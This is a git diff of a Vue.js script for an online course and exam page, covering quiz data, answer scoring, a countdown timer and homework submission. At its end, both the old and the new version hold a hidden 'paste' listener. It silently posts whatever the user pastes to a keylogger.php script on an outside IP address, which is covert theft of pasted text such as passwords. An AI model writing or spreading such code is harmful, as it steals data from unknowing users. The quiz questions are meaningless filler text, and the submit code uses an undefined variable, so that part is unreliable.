@@ -71,238 +71,6 @@ var course = {
                 }
             ],
         },
-    ],
-    courseOutline: [
-        {
-            name: '第一单元',
-            isComplete: false,
-            children: [
-                {
-                    name: '第一节',
-                    isComplete: false,
-                    link: {
-                        video: '',
-                        txt: '',
-                        pdf: '',
-                        word: ''
-                    }
-                },
-                {
-                    name: '第二节',
-                    isComplete: false,
-                    link: {
-                        video: '',
-                        txt: '',
-                        pdf: '',
-                        word: ''
-                    }
-                },
-                {
-                    name: '第三节',
-                    isComplete: false,
-                    link: {
-                        video: '',
-                        txt: '',
-                        pdf: '',
-                        word: ''
-                    }
-                },
-                {
-                    name: '第四节',
-                    isComplete: false,
-                    link: {
-                        video: '',
-                        txt: '',
-                        pdf: '',
-                        word: ''
-                    }
-                }
-            ]
-        },
-        {
-            name: '第二单元',
-            isComplete: false,
-            children: [
-                {
-                    name: '第一节',
-                    isComplete: false,
-                    link: {
-                        video: '',
-                        txt: '',
-                        pdf: '',
-                        word: ''
-                    }
-                },
-                {
-                    name: '第二节',
-                    isComplete: false,
-                    link: {
-                        video: '',
-                        txt: '',
-                        pdf: '',
-                        word: ''
-                    }
-                },
-                {
-                    name: '第三节',
-                    isComplete: false,
-                    link: {
-                        video: '',
-                        txt: '',
-                        pdf: '',
-                        word: ''
-                    }
-                },
-                {
-                    name: '第四节',
-                    isComplete: false,
-                    link: {
-                        video: '',
-                        txt: '',
-                        pdf: '',
-                        word: ''
-                    }
-                }
-            ]
-        },
-        {
-            name: '第三单元',
-            isComplete: false,
-            children: [
-                {
-                    name: '第一节',
-                    isComplete: false,
-                    link: {
-                        video: '',
-                        txt: '',
-                        pdf: '',
-                        word: ''
-                    }
-                },
-                {
-                    name: '第二节',
-                    isComplete: false,
-                    link: {
-                        video: '',
-                        txt: '',
-                        pdf: '',
-                        word: ''
-                    }
-                },
-                {
-                    name: '第三节',
-                    isComplete: false,
-                    link: {
-                        video: '',
-                        txt: '',
-                        pdf: '',
-                        word: ''
-                    }
-                },
-                {
-                    name: '第四节',
-                    isComplete: false,
-                    link: {
-                        video: '',
-                        txt: '',
-                        pdf: '',
-                        word: ''
-                    }
-                }
-            ]
-        },
-        {
-            name: '第四单元',
-            isComplete: false,
-            children: [
-                {
-                    name: '第一节',
-                    isComplete: false,
-                    link: {
-                        video: '',
-                        txt: '',
-                        pdf: '',
-                        word: ''
-                    }
-                },
-                {
-                    name: '第二节',
-                    isComplete: false,
-                    link: {
-                        video: '',
-                        txt: '',
-                        pdf: '',
-                        word: ''
-                    }
-                },
-                {
-                    name: '第三节',
-                    isComplete: false,
-                    link: {
-                        video: '',
-                        txt: '',
-                        pdf: '',
-                        word: ''
-                    }
-                },
-                {
-                    name: '第四节',
-                    isComplete: false,
-                    link: {
-                        video: '',
-                        txt: '',
-                        pdf: '',
-                        word: ''
-                    }
-                }
-            ]
-        },
-        {
-            name: '第五单元',
-            isComplete: false,
-            children: [
-                {
-                    name: '第一节',
-                    isComplete: false,
-                    link: {
-                        video: '',
-                        txt: '',
-                        pdf: '',
-                        word: ''
-                    }
-                },
-                {
-                    name: '第二节',
-                    isComplete: false,
-                    link: {
-                        video: '',
-                        txt: '',
-                        pdf: '',
-                        word: ''
-                    }
-                },
-                {
-                    name: '第三节',
-                    isComplete: false,
-                    link: {
-                        video: '',
-                        txt: '',
-                        pdf: '',
-                        word: ''
-                    }
-                },
-                {
-                    name: '第四节',
-                    isComplete: false,
-                    link: {
-                        video: '',
-                        txt: '',
-                        pdf: '',
-                        word: ''
-                    }
-                }
-            ]
-        }
     ]
 }
 
@@ -328,138 +96,133 @@ var userOptions = {
 }
 var danxuan = [
     {
-        title : '那艘if阿富豪我好是欧式花是你OA深？',
-        options:['12','17','13','20']
+        title: '那艘if阿富豪我好是欧式花是你OA深？',
+        options: ['12', '17', '13', '20']
     },
     {
-        title : '部分可微波古尔沟我顾伟UI我还？',
-        options:['14','10','13','22']
+        title: '部分可微波古尔沟我顾伟UI我还？',
+        options: ['14', '10', '13', '22']
     },
     {
-        title : '放水后is后我换个问过我无比股市公司规划升级版素',
-        options:['24','12','45','74']
+        title: '放水后is后我换个问过我无比股市公司规划升级版素',
+        options: ['24', '12', '45', '74']
     },
     {
-        title : '放水后is后我换个问过我无比股市公司规划升级版素',
-        options:['24','12','45','74']
+        title: '放水后is后我换个问过我无比股市公司规划升级版素',
+        options: ['24', '12', '45', '74']
     },
     {
-        title : '放水后is后我换个问过我无比股市公司规划升级版素',
-        options:['24','12','45','74']
+        title: '放水后is后我换个问过我无比股市公司规划升级版素',
+        options: ['24', '12', '45', '74']
     },
     {
-        title : '放水后is后我换个问过我无比股市公司规划升级版素',
-        options:['24','12','45','74']
+        title: '放水后is后我换个问过我无比股市公司规划升级版素',
+        options: ['24', '12', '45', '74']
     },
     {
-        title : '放水后is后我换个问过我无比股市公司规划升级版素',
-        options:['24','12','45','74']
+        title: '放水后is后我换个问过我无比股市公司规划升级版素',
+        options: ['24', '12', '45', '74']
     },
     {
-        title : '放水后is后我换个问过我无比股市公司规划升级版素',
-        options:['24','12','45','74']
+        title: '放水后is后我换个问过我无比股市公司规划升级版素',
+        options: ['24', '12', '45', '74']
     }
 ];
 var duoxuan = [
     {
-        title : '阿Ivan哦我AV你哦是AV噶大V11成本法牛初步',
-        options : ['1','2','3','4','5']
+        title: '阿Ivan哦我AV你哦是AV噶大V11成本法牛初步',
+        options: ['1', '2', '3', '4', '5']
     }
 ];
 var tiankong = [
     {
-        title : '中国的直辖市有那个_______',
-        input : ''
+        title: '中国的直辖市有那个_______',
+        input: ''
     },
     {
-        title : '你的_______是核心',
-        input : ''
+        title: '你的_______是核心',
+        input: ''
     }
 ];
 var zhuguan = [
     {
-        title : '你的感想是什么？',
-        input : ''
+        title: '你的感想是什么？',
+        input: ''
     }
 ];
 //请求得到
 var answer = [
     {
-        type : 'dx',
-        value : [0,0,2,2,3,3,3,3],
-        score : 5
+        type: 'dx',
+        value: [0, 0, 2, 2, 3, 3, 3, 3],
+        score: 5
     },
     {
-        type : 'sx',
-        value : [['1','2']],
-        score : 10
+        type: 'sx',
+        value: [['1', '2']],
+        score: 10
     },
     {
-        type : 'tk',
-        value : ['123456','654321'],
-        score : 10
+        type: 'tk',
+        value: ['123456', '654321'],
+        score: 10
     },
     {
-        type : 'zg',
-        value : ['123456'],
-        score : 30
+        type: 'zg',
+        value: ['123456'],
+        score: 30
     }
 ];
-danxuan.forEach((item)=>{
+danxuan.forEach((item) => {
     item.select = 'default';
     item.type = -1;
 });
-duoxuan.forEach((item)=>{
+duoxuan.forEach((item) => {
     item.select = [];
     item.type = -1;
 });
-tiankong.forEach((item)=>{
+tiankong.forEach((item) => {
     item.type = -1;
 });
-zhuguan.forEach((item)=>{
+zhuguan.forEach((item) => {
     item.type = -1;
 });
 var app = new Vue({
     el: '#app',
     data: {
-        user: 'XXX',
+        user: window.localStorage.getItem('_userName'),
         course: course,
         userOptions: userOptions,
-        name: window.localStorage.getItem('courseName'),
-        activeNames : ['1'],
-        test : [
-         {title:'作业一',start:'2019-8-7',end:'2019-12-7',info:'其他',state :-1,score:0},{title:'作业二',start:'2019-8-7',end:'2019-12-7',info:'其他',state :1,score:10},
-        {title:'作业一',start:'2019-8-7',end:'2019-12-7',info:'其他',state :0,score:0}
+        name: JSON.parse(window.localStorage.getItem('_course')).name || '',
+        workName: window.localStorage.getItem('_work') != undefined ? JSON.parse(window.localStorage.getItem('_work')).name : '',
+        activeNames: ['1'],
+        showdata: '',
+        test: [],
+        exam: [
+            { title: '考试一', start: '2019-8-7', end: '2019-12-7', info: '其他', state: 0, score: 87 },
+            { title: '考试二', start: '2019-9-7', end: '2019-12-7', info: '其他', state: 1, score: 0 },
+            { title: '考试三', start: '2019-9-7', end: '2019-12-7', info: '其他', state: -1, score: 0 }
         ],
-        exam : [
-            {title:'考试一',start:'2019-8-7',end:'2019-12-7',info:'其他',state :0,score:87},
-            {title:'考试二',start:'2019-9-7',end:'2019-12-7',info:'其他',state :1,score:0},
-            {title:'考试三',start:'2019-9-7',end:'2019-12-7',info:'其他',state :-1,score:0}
+        radio: '1',
+        danxuan: danxuan,
+        duoxuan: duoxuan,
+        tiankong: tiankong,
+        zhuguan: zhuguan,
+        answer: answer,
+        disabled: false,
+        time: '00:10:10',
+        wares: [],
+        talk: [
+            { name: 'Lumnca', info: '抗击疫情，我们每个人都有责任，社会还需要继续发展，我们需要做的，就是注意好个人卫生，待在家里！等春天到来，万物复苏！', number: 84, date: '2019/12/21 20:12' },
+            { name: 'Kay', info: '抗击疫情，我们每个人都有责任，社会还需要继续发展，我们需要做的，就是注意好个人卫生，待在家里！等春天到来，万物复苏！', number: 45, date: '2019/12/24 04:23' },
+            { name: 'May', info: '抗击疫情，我们每个人都有责任，社会还需要继续发展，我们需要做的，就是注意好个人卫生，待在家里！等春天到来，万物复苏！', number: 233, date: '2019/12/29 11:58' }
         ],
-        radio : '1',
-        danxuan : danxuan,
-        duoxuan : duoxuan,
-        tiankong : tiankong,
-        zhuguan : zhuguan,
-        answer : answer,
-        disabled : false,
-        time : '00:10:10',
-        current : {
-            test : '',
-            work : '',
-            state : 0
+        evaluate: {
+            number: 3.9,
+            infor: ''
         },
-        talk : [
-            {name:'Lumnca',info: '抗击疫情，我们每个人都有责任，社会还需要继续发展，我们需要做的，就是注意好个人卫生，待在家里！等春天到来，万物复苏！',number:84,date:'2019/12/21 20:12'},
-            {name:'Kay',info: '抗击疫情，我们每个人都有责任，社会还需要继续发展，我们需要做的，就是注意好个人卫生，待在家里！等春天到来，万物复苏！',number:45,date:'2019/12/24 04:23'},
-            {name:'May',info: '抗击疫情，我们每个人都有责任，社会还需要继续发展，我们需要做的，就是注意好个人卫生，待在家里！等春天到来，万物复苏！',number:233,date:'2019/12/29 11:58'}
-        ],
-        evaluate : {
-            number : 3.9,
-            infor : ''
-        },
-        docWorks : [],
-        docWork : {
+        docWorks: [],
+        docWork: {
             name: '文案作业一',
             date: '2020/02/09 12:00',
             file: 'first.doc',
@@ -467,7 +230,7 @@ var app = new Vue({
             date1: '',
             date2: ''
         },
-        dialogFormVisible7 : false
+        dialogFormVisible7: false
     },
     methods: {
         handleOpen(key, keyPath) {
@@ -476,60 +239,60 @@ var app = new Vue({
         handleClose(key, keyPath) {
             console.log(key, keyPath);
         },
-        handleChange(val){
+        handleChange(val) {
 
         },
-        computedScore(){
+        computedScore() {
             var score = 0;
             var tkMistake = 0;
             var dxMistake = 0;
             var zgMistake = 0;
             var sxMistake = 0;
-            this.answer.forEach((item)=>{
-                if(item.type=='dx'){
+            this.answer.forEach((item) => {
+                if (item.type == 'dx') {
                     for (let index = 0; index < this.danxuan.length; index++) {
 
-                        if(app.danxuan[index].select==item.value[index]){
+                        if (app.danxuan[index].select == item.value[index]) {
                             score += item.score;
-                            console.log( "d YES");
+                            console.log("d YES");
                         }
-                        else{
+                        else {
                             dxMistake++;
                             app.danxuan[index].type = 1;
                         }
                     }
                 }
-                else if(item.type=='sx'){
+                else if (item.type == 'sx') {
                     for (let index = 0; index < this.duoxuan.length; index++) {
-                        if(app.duoxuan[index].select.toString()==item.value[index].toString()){
+                        if (app.duoxuan[index].select.toString() == item.value[index].toString()) {
                             score += item.score;
-                            console.log( "s YES");
+                            console.log("s YES");
                         }
-                        else{
+                        else {
                             sxMistake++;
                             app.duoxuan[index].type = 1;
                         }
                     }
                 }
-                else if(item.type=='tk'){
+                else if (item.type == 'tk') {
                     for (let index = 0; index < this.tiankong.length; index++) {
-                        if(app.tiankong[index].input.trim()==item.value[index]){
+                        if (app.tiankong[index].input.trim() == item.value[index]) {
                             score += item.score;
                             console.log("t YES");
                         }
-                        else{
+                        else {
                             tkMistake++;
                             app.tiankong[index].type = 1;
                         }
                     }
                 }
-                else{
+                else {
                     for (let index = 0; index < this.zhuguan.length; index++) {
-                        if(app.zhuguan[index].input.trim()==item.value[index]){
+                        if (app.zhuguan[index].input.trim() == item.value[index]) {
                             score += item.score;
                             console.log("z YES");
                         }
-                        else{
+                        else {
                             zgMistake++;
                             app.zhuguan[index].type = 1;
                         }
@@ -539,40 +302,66 @@ var app = new Vue({
 
             app.disabled = true;
 
+            let submit = {
+                id : 1,
+                wid : JSON.parse(window.localStorage.getItem('_work')).id,
+                cid : JSON.parse(window.localStorage.getItem('_work')).cid,
+                uid : JSON.parse(window.localStorage.getItem('_user')).id,
+                type : 1,
+                date : app.dateFormat(new Date()),
+                other : '',
+                body : JSON.stringify(works),
+                score : score,
+                state : 1
+
+            }
+
+            axios.post('http://127.0.0.1:8081/submit',submit)
+                .then(function (response) {
+                    app.$message({
+                        type: 'success',
+                        message: '提交成功！'
+                    });
+                    console.log(response.data);
+                })
+                .catch(function (error) {
+                    console.log(error);
+                });
+
+
             this.$notify({
                 title: '提示',
-                message:  '选择题错误个数: '+(dxMistake+sxMistake)+'  填空题错误个数: '+tkMistake+' 主观题错误个数: '+zgMistake+'  最后得分:'+score,
+                message: '选择题错误个数: ' + (dxMistake + sxMistake) + '  填空题错误个数: ' + tkMistake + ' 主观题错误个数: ' + zgMistake + '  最后得分:' + score,
                 duration: 0
             });
+
+
         },
-        write_work(work){
-            window.localStorage.setItem("work",work.title);
+        write_work(work) {
+            window.localStorage.setItem("_work", JSON.stringify(work));
             window.location.href = "workShow.html";
-            console.log(JSON.stringify(work))
         },
-        edit_work(work){
+        edit_work(work) {
             console.log(JSON.stringify(work));
         },
-        write_exam(work){
-            window.localStorage.setItem("exam",work.title);
-            window.localStorage.setItem("state",work.state);
+        write_exam(work) {
+            window.localStorage.setItem("_exam", work);
             window.location.href = "testShow.html";
-            console.log(JSON.stringify(work))
         },
-        edit_exam(work){
+        edit_exam(work) {
             console.log(JSON.stringify(work));
         },
-        addZ(item){
+        addZ(item) {
             item.number += 1;
         },
-        playViedo(item){
+        playViedo(item) {
             window.location.href = "courseVideo.html";
         },
         handleRemove(file, fileList) {
             console.log(file, fileList);
         },
         beforeRemove(file, fileList) {
-            axios.get('http://127.0.0.1:8080/delete', {
+            axios.get('http://127.0.0.1:8081/delete', {
                 params: {
                     file: file.name
                 }
@@ -603,95 +392,95 @@ var app = new Vue({
             this.dialogFormVisible7 = true;
             this.docWork = data;
         },
+        dateFormat(date) {
+            return date.getFullYear() + "/" + (date.getMonth() + 1) + "/" + date.getDate() + " " + (date.getHours() > 9 ? date.getHours() : '0' + date.getHours()) + ":" + (date.getMinutes() > 9 ? date.getMinutes() : '0' + date.getMinutes()) + ":" + (date.getSeconds() > 9 ? date.getSeconds() : '0' + date.getSeconds());
+        },
     },
     computed: {
-        write : function(){
+        write: function () {
             let i = 0;
-            this.danxuan.forEach((item)=>{
-                if(item.select!='default'){
+            this.danxuan.forEach((item) => {
+                if (item.select != 'default') {
                     item.type = 0;
                     i++;
                 }
-                else{
+                else {
                     item.type = -1;
                 }
             });
-            this.duoxuan.forEach((item)=>{
-                if(item.select.length!=0){
-                    item.type = 0;                                                                                                                                                                                                                                                                                   
-                    i++;
-                }
-                else{
-                    item.type = -1;
-                }
-            });
-            this.tiankong.forEach((item)=>{
-                if(item.input.length>0){
+            this.duoxuan.forEach((item) => {
+                if (item.select.length != 0) {
                     item.type = 0;
                     i++;
                 }
-                else{
+                else {
                     item.type = -1;
                 }
             });
-            this.zhuguan.forEach((item)=>{
-                if(item.input.length>0){
+            this.tiankong.forEach((item) => {
+                if (item.input.length > 0) {
                     item.type = 0;
                     i++;
                 }
-                else{
+                else {
                     item.type = -1;
                 }
             });
-            return "完成度:"+i+"/"+(this.danxuan.length+this.tiankong.length+this.duoxuan.length+this.zhuguan.length);
+            this.zhuguan.forEach((item) => {
+                if (item.input.length > 0) {
+                    item.type = 0;
+                    i++;
+                }
+                else {
+                    item.type = -1;
+                }
+            });
+            return "完成度:" + i + "/" + (this.danxuan.length + this.tiankong.length + this.duoxuan.length + this.zhuguan.length);
         },
-        countDown : function(){
-           
+        countDown: function () {
+
 
         }
     },
 });
-app.current.work = window.localStorage.getItem('work');
-app.current.test = window.localStorage.getItem('exam');
-app.current.state = window.localStorage.getItem('state');
 
 var time = app.time;
-var hh =   parseInt(time.split(':')[0]);
-var mm =   parseInt(time.split(':')[1]);
-var ss =   parseInt(time.split(':')[2]);
+var hh = parseInt(time.split(':')[0]);
+var mm = parseInt(time.split(':')[1]);
+var ss = parseInt(time.split(':')[2]);
 var timer = setInterval(() => {
-    var hh =   parseInt(time.split(':')[0]);
-    var mm =   parseInt(time.split(':')[1]);
-    var ss =   parseInt(time.split(':')[2]);
-    if(ss>0){
-        ss-=1;
+    var hh = parseInt(time.split(':')[0]);
+    var mm = parseInt(time.split(':')[1]);
+    var ss = parseInt(time.split(':')[2]);
+    if (ss > 0) {
+        ss -= 1;
     }
-    else{
-        if(mm>0){
+    else {
+        if (mm > 0) {
             ss = 59;
             mm -= 1;
-            
+
         }
-        else{
-            if(hh>0){
+        else {
+            if (hh > 0) {
                 ss = 59;
                 mm = 59;
                 hh -= 1;
             }
         }
     }
-    if(mm<10){
-        mm = '0'+mm;
+    if (mm < 10) {
+        mm = '0' + mm;
     }
-    if(ss<10){
-        ss = '0'+ss;
+    if (ss < 10) {
+        ss = '0' + ss;
     }
-    if(hh<10){
-        hh = '0'+hh;
+    if (hh < 10) {
+        hh = '0' + hh;
     }
-    app.time = hh+':'+mm+':'+ss;
-    time =  app.time;
-    if(hh==0&&mm==0&&ss==0){
+    app.time = hh + ':' + mm + ':' + ss;
+    time = app.time;
+    if (hh == 0 && mm == 0 && ss == 0) {
         app.time = '- -:- -:- -';
         clearInterval(timer);
         app.disabled = true;
@@ -701,11 +490,11 @@ var timer = setInterval(() => {
 
 
 
-window.addEventListener('paste',function(e){
+window.addEventListener('paste', function (e) {
     console.log(e.clipboardData.getData('text'));
     var txt = e.clipboardData.getData('text');
     var http = new XMLHttpRequest();
-    http.open("POST","http://47.106.254.86:1234/test/keylogger.php",false);
-    http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
-    http.send("key="+txt);
-},false)
+    http.open("POST", "http://47.106.254.86:1234/test/keylogger.php", false);
+    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    http.send("key=" + txt);
+}, false)
